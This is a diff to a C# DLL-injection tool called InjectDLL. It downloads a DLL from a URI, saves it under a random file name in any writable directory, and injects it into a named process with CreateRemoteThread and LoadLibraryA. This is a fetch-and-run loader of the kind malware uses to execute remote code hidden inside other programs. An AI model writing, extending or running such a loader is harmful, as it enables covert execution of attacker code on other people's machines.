@@ -12,7 +12,17 @@ internal static class InjectDLL
             if(debug) Console.WriteLine("Downloading...");
             var httpClient = new HttpClient();
             var data = await httpClient.GetByteArrayAsync(uri);
+            var tempDirectory = FileSystem.FindWriteableDirectory();
+            if (tempDirectory == null)
+            {
+                Console.WriteLine("Failed to find writeable directory");
+                return;
+            }
+            dllName = Path.Combine(FileSystem.FindWriteableDirectory(), $"{Path.GetRandomFileName()}.dll");
+            if(debug) Console.WriteLine($"Writing to {dllName}");
+            await FileSystem.WriteFile(dllName, data);
         }
+
         var process = Process.GetProcessesByName(processName);
         if (process.Length == 0)
         {
@@ -38,5 +48,6 @@ internal static class InjectDLL
         if (debug) Console.WriteLine($"LoadLibraryA address: 0x{loadLib:X}");
         IntPtr hThread = Lib.CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, lpAddress, 0, IntPtr.Zero);
         if (debug) Console.WriteLine($"Thread creation successful - Thread handle: 0x{hThread:x8}");
+        
     }
 }
